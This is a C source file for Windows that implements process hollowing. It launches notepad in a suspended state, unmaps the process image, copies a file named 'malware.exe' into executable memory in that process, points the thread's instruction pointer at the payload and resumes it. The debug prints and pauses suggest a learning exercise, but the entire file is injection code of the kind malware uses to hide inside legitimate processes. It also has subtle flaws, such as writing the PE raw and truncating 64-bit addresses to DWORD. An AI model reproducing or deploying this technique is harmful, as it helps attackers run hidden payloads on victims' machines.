#include <windows.h>
#include <stdio.h>

#include <winnt.h>
#include <winternl.h> // definitions of NT functions
// read information of NTSTATUS at https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55

typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

typedef NTSTATUS(WINAPI* NtQueryInformationProcessFunc)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

BOOL CreateSuspendedProcess(PROCESS_INFORMATION *pi, char *pDestCmdLine, char *pSourceFile) {
    printf("\n\n\n***** CreateSuspendedProcess *****\n");

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    ZeroMemory(pi, sizeof(*pi));

    BOOL result = CreateProcess(
		0,
		pDestCmdLine,		
		0, 
		0, 
		FALSE, 
		CREATE_SUSPENDED, // create process in a suspended state
		0, 
		0, 
		&si, 
		pi
	);
    if (!result) {
        printf("Failed to create process. error code: %lu\n", GetLastError());
        return FALSE;
    }
    printf("New process created Successfully! (PID: %lu)\n", pi->dwProcessId);
    return TRUE;
}

PVOID GetProcessBaseAddress(HANDLE hProcess) {
    printf("\n\n\n***** GetProcessBaseAddress *****\n");

    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    NtQueryInformationProcessFunc NtQueryInformationProcess = (NtQueryInformationProcessFunc)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        0, // ProcessBasicInformation
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status < 0) {
        printf("NtQueryInformationProcess failed.\n");
        CloseHandle(hProcess);
        return 0;
    }

    printf("PEB address: %p\n", pbi.PebBaseAddress);

    // Read the ImageBaseAddress from the PEB
    PVOID imageBaseAddress;
    if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBaseAddress, sizeof(PVOID), NULL)) {
        printf("Failed to read image base address from process.\n");
        return 0;
    }
    printf("Image base address: %p\n", imageBaseAddress);

    return imageBaseAddress;
}

BOOL UnmapProcessMemory(PROCESS_INFORMATION *pi) {
    printf("\n\n\n***** UnmapProcessMemory *****\n");
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if(!NtUnmapViewOfSection) {  
        printf("Cannot load function 'NtUnmapViewOfSection' from 'ntdll.dll'.\n");
        return FALSE;
    }
    
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T bytesRead;
    void* baseAddress = GetProcessBaseAddress(pi->hProcess);
    printf("*Process image base address to unmap: %p\n", baseAddress);

    while (VirtualQueryEx(pi->hProcess, baseAddress, &mbi, sizeof(mbi))) {
        printf("Memory region info - size:0x%x, base:%p, state|type:0x%x|0x%x", mbi.RegionSize, mbi.BaseAddress, mbi.State, mbi.Type);
        if (mbi.State == MEM_COMMIT && (mbi.Type == MEM_IMAGE || mbi.Type == MEM_MAPPED)) {
            printf("(committed|??)");
            NTSTATUS status = NtUnmapViewOfSection(pi->hProcess, mbi.BaseAddress);  // 마지막 success에서 img가 unmap된다. x64dbg에서는 왜 해당 base주소가 이미지랑 위치가 안 맞는지 모를일...
            VirtualQueryEx(pi->hProcess, baseAddress, &mbi, sizeof(mbi)); // re-check state and type
            if (status != 0) {
                printf("->0x%x|0x%x  *Failed to unmap. NTSTATUS: 0x%lx\n", mbi.State, mbi.Type, status);
            }else {
                printf("->0x%x|0x%x  *unmapped successfully!\n", mbi.State, mbi.Type);
            }
        }else {
            printf("\n");
        }
        baseAddress = mbi.BaseAddress + mbi.RegionSize;
    }
    return TRUE;
}

DWORD GetPayloadEntryPoint(const char *payload) {
    printf("\n\n\n***** GetPayloadEntryPoint *****\n");

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid DOS header.\n");
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT header.\n");
        return 0;
    }

    // calculate the entry point
    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    DWORD imageBase = ntHeaders->OptionalHeader.ImageBase;
    printf("Entry point of payload's PE header: %p\n", imageBase + entryPointRVA);
    return imageBase + entryPointRVA;
}

BOOL WritePayloadToMemory(PROCESS_INFORMATION *pi, DWORD *pEntryPoint, char *pSourceFile) {
    printf("\n\n\n***** WritePayloadToMemory *****\n");
    // open payload file
    HANDLE hFile = CreateFileA(pSourceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Cannot open file '%s'. error code: %lu\n", pSourceFile, GetLastError());
        return FALSE;
    }
    // get file size
    DWORD payloadSize = GetFileSize(hFile, NULL);
    if (payloadSize == INVALID_FILE_SIZE) {
        printf("Failed to get file size. error code: %lu\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }
    // allocate memory the size of the file content to be written
    void* remoteAddress = VirtualAllocEx(
        pi->hProcess, 
        NULL, 
        payloadSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteAddress) {
        printf("Failed to allocate remote memory. error code: %lu\n", GetLastError());
        return FALSE;
    }
    printf("Remote memory allocated successfully! address: %p\n", remoteAddress);

    // get file content
    char* payload = (char*)malloc(payloadSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, payload, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize) {
        printf("Cannot read file content. error code: %lu\n", GetLastError());
        free(payload);
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);

    // write to memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi->hProcess, remoteAddress, payload, payloadSize, &bytesWritten) || bytesWritten != payloadSize) {
        printf("Failed to write data to remote memory. error code: %lu\n", GetLastError());
        free(payload);
        return FALSE;
    }
    *pEntryPoint = GetPayloadEntryPoint(payload);
    printf("Payload successfully written! entry point: %p\n", *pEntryPoint);
    return TRUE;
}

BOOL SetEntryPointAndResume(PROCESS_INFORMATION *pi, DWORD entryPoint) {
    printf("\n\n\n***** SetEntryPointAndResume *****\n");

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    // get context of current thread
    if (!GetThreadContext(pi->hThread, &ctx)) {
        printf("Cannot get context of current thread. error code: %lu\n", GetLastError());
        return FALSE;
    }
    // move RIP(or EIP) to new entry point
#ifdef _WIN64
    ctx.Rip = entryPoint;
#else
    ctx.Eip = (DWORD)entryPoint;
#endif

    // update the thread context
    if (!SetThreadContext(pi->hThread, &ctx)) {
        printf("Failed to set new context to target thread. error code: %lu\n", GetLastError());
        return FALSE;
    }
    printf("New context set successfully! entry point: %p\n", entryPoint);
    
    system("pause");

    // resume at new context
    if (ResumeThread(pi->hThread) == (DWORD)-1) {
        printf("Cannot resume thread. error code: %lu\n", GetLastError());
        return FALSE;
    }
    printf("Thread resumed successfully.\n");
    return TRUE;
}


int main(int argc, char *argv[]) {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH); // current module path
    path[strrchr(path, '\\') - path + 1] = 0;
    strcat(path, "malware.exe");
    
    PROCESS_INFORMATION pi;
    CreateSuspendedProcess(&pi, "notepad", path);

    UnmapProcessMemory(&pi);

    DWORD entryPoint = 0;
    WritePayloadToMemory(&pi, &entryPoint, path);

    SetEntryPointAndResume(&pi, entryPoint);

    system("pause");


    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}